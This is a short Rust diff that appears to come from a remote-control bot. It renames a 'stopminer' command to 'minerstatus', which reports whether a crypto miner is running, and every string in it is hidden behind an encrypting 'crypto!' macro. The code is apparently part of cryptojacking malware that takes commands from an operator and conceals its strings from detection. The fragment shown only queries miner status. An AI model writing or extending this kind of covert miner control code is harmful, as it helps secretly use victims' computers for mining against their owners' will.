@@ -1,15 +1,15 @@
 use super::prelude::*;
 
-pub struct Stopminer;
+pub struct MinerStatus;
 
 #[async_trait]
-impl Command for Stopminer {
+impl Command for MinerStatus {
     fn name(&self) -> String {
-        crypto!("stopminer")
+        crypto!("minerstatus")
     }
 
     fn help(&self) -> String {
-        crypto!("Stopping crypto miner")
+        crypto!("Get status about crypto miner")
     }
 
     fn min_args(&self) -> usize {
@@ -17,7 +17,6 @@ impl Command for Stopminer {
     }
 
     async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
-        crypto::stop_miner()?;
-        client.send(ok(crypto!("Minerhas been stopped")))
+        client.send(ok(format!("{}",crypto::is_runned())))
     }
 }
